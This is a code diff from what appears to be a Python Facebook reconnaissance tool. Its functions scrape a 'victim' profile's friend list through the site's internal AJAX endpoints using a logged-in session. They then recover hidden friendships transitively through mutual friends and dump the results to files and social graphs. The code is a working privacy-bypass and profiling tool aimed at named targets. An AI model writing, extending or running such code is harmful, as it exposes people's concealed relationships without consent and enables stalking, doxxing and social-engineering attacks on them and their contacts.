+            match = re.search('All Friends',resultado)
+            matchBis = re.search('Todos los amigos',resultado)
+            matchBisBis = re.search('Todos mis amigos',resultado)
+            if ((match is not None) or (matchBis is not None) or (matchBisBis is not None)):
+                matchFriends = re.search('id="friendsTypeaheadResults(.+)"',resultado).group()
+                return matchFriends 
+            else:
+                return -1
+    except:
+        print 'Error in the process, brute force will be applied ..'
+        return -1
+    
+def simpleGraph(friends, victim):
+    coleccion = {}
+    nodeID = 0
+
+    root = 'dumps'
+    directory = str(victim)
+    
+    mkdir(directory,root)
+    
+    myGraph = nx.Graph()
+    
+    coleccion[victim] = nodeID
+    
+    victima = nodeID
+    myGraph.add_node(victima)
+    nodeID += 1
+    #Check if the file exists, if true append, else create and writes
+    try:
+        friendshipFile = open(root+'/'+directory+'/'+victim+'.txt',"ab")
+    except:
+        friendshipFile = open(root+'/'+directory+'/'+victim+'.txt',"wb")
+        
+    for friend in friends:
+        
+        friendshipFile.write(str(friend)+'\n')
+        
+        try:
+            mutual = coreFriendshipPrivacy(victim, friend)
+        except:
+            continue
+        
+        coleccion[friend] = nodeID
+        nodeID += 1
+        
+        if myGraph.has_node(friend) != True:
+            myGraph.add_node(friend)
+        
+            
+        if myGraph.has_edge(victima, friend) != True:
+            myGraph.add_edge(victima, friend)
+
+        for element in mutual:
+            if myGraph.has_node(element) != True:
+                myGraph.add_node(element)
+                myGraph.add_edge(element, friend)
+        
+    friendshipFile.close()
+    
+    mkdir('objects',root+'/'+directory)
+    
+    A = nx.adj_matrix(myGraph)
+    saveObjects(victim, A, coleccion)
+    
+    nx.draw_spring(myGraph,node_color = np.linspace(0,1,len(myGraph.nodes())),edge_color = np.linspace(0,1,len(myGraph.edges())) ,with_labels=True)
+    plt.savefig(root+'/'+directory+'/'+victim+"graph_color.pdf")
+    plt.savefig(root+'/'+directory+'/'+victim+"graph_color.png")
+    write_dot(myGraph,root+'/'+directory+'/'+victim+"graph_color.dot")    
+    plt.show()
+    
+def friendshipPlot(text,victim):
+    friends = []
+    friendsID = []
+    counter = 0
+    lastId = 0
+    while counter < 4:
+        matchStart = re.search("_5q6s _8o _8t lfloat _ohe\" href=\"https://www.facebook.com/",text)
+        if matchStart is not None:
+            start = matchStart.end()
+            matchEnd = re.search("\?",text[start:])
+            name = text[start:matchEnd.start()+start]
+            if (name not in friends) and (name != "profile.php"):
+                friends.append(name)
+                fbid = getUserID(name)
+                if fbid is not -1:
+                    friendsID.append(fbid)
+            text = text[matchEnd.start()+start:]
+        else:
+            try:
+                c_user = getC_user()
+                userId = getUserID(victim)
+                if getUserID(friends[len(friends)-1]) == lastId:
+                    counter += 1
+                lastId = getUserID(friends[len(friends)-1])
+                encoded = b64encode('0:not_structured:'+str(lastId))
+                response = br.open('https://www.facebook.com/ajax/pagelet/generic.php/AllFriendsAppCollectionPagelet?data={"collection_token":"'+userId+':2356318349:2","cursor":"'+encoded+'","tab_key":"friends","profile_id":'+userId+',"q":"'+victim+'","overview":false,"ftid":null,"order":null,"sk":"friends","importer_state":null}&__user='+c_user+'&__a=1&__dyn=7n8apij2qmp5zpQ9UoHbgWyxi9ACwKyaF299qzCAjFDxCm&__req=7&__rev=1183274')
+                to_parse = str(response.read()).strip('for (;;);')
+                try:
+                    #Converts the json web response to a python like object
+                    json_dump = json.loads(to_parse)
+                    text = json_dump["payload"]
+                except:
+                    print 'Error on json loading' 
+                
+            except:
+                print 'ERROR MOTHER FUCKER'
+    return friendsID, friends
 
 def coreFriendshipPrivacy(victim,transitive):
     friends = []
@@ -1715,6 +1843,7 @@ def coreFriendshipPrivacy(victim,transitive):
         match = re.search('timelineFriendsColumnHeader',resultado)
         if match is not None:
             linea = re.search('timelineFriendsColumnHeader(.+)',resultado).group()
+
 
     except mechanize.HTTPError as e:
             print e.code
@@ -1736,11 +1865,13 @@ def coreFriendshipPrivacy(victim,transitive):
             #Search the string to get the position of the starting match
             matchAnd = re.search('user\.php\?id=',linea[start:])
             #Search the end of the match for taking the id length
-            matchEnd = re.search('">',linea[start+matchAnd.end():])
+            matchEnd = re.search('&amp',linea[start+matchAnd.end():])
             #If we have a start and an end, we have the id value   
             if (matchAnd and matchEnd) is not None:
                 #Appends the value given the proper position (resolved a few lines up)
-                friends.append(linea[start+matchAnd.end():start+matchEnd.start()+matchAnd.end() ])
+                toUserID = linea[start+matchAnd.end():start+matchEnd.start()+matchAnd.end()]
+                if toUserID not in friends:
+                    friends.append(toUserID)
                 #Moves the pointer for next match
                 start += matchEnd.start()+matchAnd.end()
         #If the match ends (Equals of end of the line for the search)
@@ -1842,3 +1973,152 @@ def logs(messagelog):
     log = str(cTime) + ' : ' + str(messagelog) + '\n'
     f.write(log)
     f.close()
+    
+    
+def dotFile(victim, transitive):
+
+    root = 'dumps'
+    directory = str(victim)
+    
+    mkdir(directory,root)
+    
+    myGraph = open(root+'/'+directory+'/'+victim+'_dot.dot',"wb")
+    myGraph.write('Graph {\n')
+    
+    #Percentage container
+    percentage = 0.0
+    #Disclosude friends container
+    friendships = []
+    #Already visited nodes container
+    visited = []  
+    try:
+        #If the file already exists 
+        friendshipFile = open(root+'/'+directory+'/'+victim+'.txt',"rb")
+        #Reads every line of the file
+        while True:
+            linea = friendshipFile.readline()
+            if not linea:
+                break
+            #Store in the visited array for non repetition
+            visited.append(linea.strip("\n\r"))
+        friendshipFile.close()
+
+    except:
+        #If the file does not exists, creates the file
+        friendshipFile = open(root+'/'+directory+'/'+victim+'.txt',"wb")
+        friendshipFile.close()
+     
+    
+    try:
+        #Generates the first level of the search
+        result = coreFriendshipPrivacy(victim,transitive)
+    except:
+        print 'Check the internet connection please..'
+        return
+    
+    #Stores non repetitive values in the disclosed friends container
+    transitivo = getName(transitive)
+    for individuos in result:
+        if individuos not in visited:
+            chabon = getName(individuos)
+            myGraph.write('    "'+transitivo + '" -> "' + chabon + '";\n')          
+            friendships.append(individuos)
+    visited.append(getUserID(transitive))
+    #Counter for percentage calculus purpose 
+    i = 0.0
+    #flush
+    print '\r                                                        \r',
+    #For every value in the first disclosed list, repeats until every value has been tried    
+    for friends in friendships:
+        #Percentage calculus 
+        percentage = (i * 100.0)/len(friendships)
+        
+        print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
+        i+=1
+        #Only if the node wasn't visited 
+        if friends not in visited:
+            #if coreFriendshipPrivacy() fails, an exception is caught. Therefore, state will still be True. 
+            #Only if the try passes, the infinite while will end. (For internet error connection problem)
+            state = True
+            while state == True:
+                try:
+                    result = coreFriendshipPrivacy(victim,friends)
+                    state = False
+                except signalCaught as e:
+                    state = False
+                    print 'Signal Caught handler'
+                    print '%s ' %e.args[0]
+                    return
+                except:
+                    logs('Check the internet connection please.. Press enter when it\'s done')
+                    print '\r                                                                       \r',
+                    a = raw_input('\rCheck the internet connection please.. Press enter when it\'s done\r')
+                    if a == 1:
+                        state = False
+                    else:
+                        if a == 2:
+                            email,password = setMail()
+                            login(email,password,'real')
+            
+            #Stores non repetitive values in the disclosed friends container
+            friendName = getName(friends)    
+            for element in result:
+                if element not in friendships:
+                    transitive = getName(element)
+                    myGraph.write('    "'+friendName + '" -> "' + transitive + '";\n')
+                    friendships.append(element)
+            
+            #Stores every single value of friendships list already analysed for non repetitiveness
+            visited.append(friends)
+            
+    #Check if the file exists, if true append, else create and writes
+    try:
+        friendshipFile = open(root+'/'+directory+'/'+victim+'.txt',"ab")
+    except:
+        friendshipFile = open(root+'/'+directory+'/'+victim+'.txt',"wb")
+        
+    #Stores every userID for further analysis
+    for friends in friendships:
+        transitivo = getName(friends)
+        myGraph.write('    "'+victim + '" -> "' + transitivo + '";\n')
+        friendshipFile.write(str(friends)+'\n')
+    
+    myGraph.write('}')
+    friendshipFile.close()
+    myGraph.close()
+
+def simpleDotGraph(friends, victim):
+    root = 'dumps'
+    directory = str(victim)
+    
+    mkdir(directory,root)
+    
+    myGraph = open(root+'/'+directory+'/'+victim+'_dot.dot',"wb")
+    myGraph.write('Graph    {\n')
+    
+  
+    friendshipFile = open(root+'/'+directory+'/'+victim+'.txt',"wb")
+    for friend in friends:
+        friendshipFile.write(str(friend)+'\n')
+    friendshipFile.close()
+    
+    
+    for friend in friends:
+        try:
+            mutual = coreFriendshipPrivacy(victim, friend)
+        except:
+            continue
+        
+              
+        transitive = getName(friend)
+            
+        myGraph.write('    "'+victim + '" -> "' + transitive + '";\n')
+        
+        for element in mutual:
+
+            mutualFriend = getName(element)
+                
+            myGraph.write('    "'+transitive + '" -> "' + mutualFriend + '";\n')
+
+    myGraph.write('}')    
+    myGraph.close()
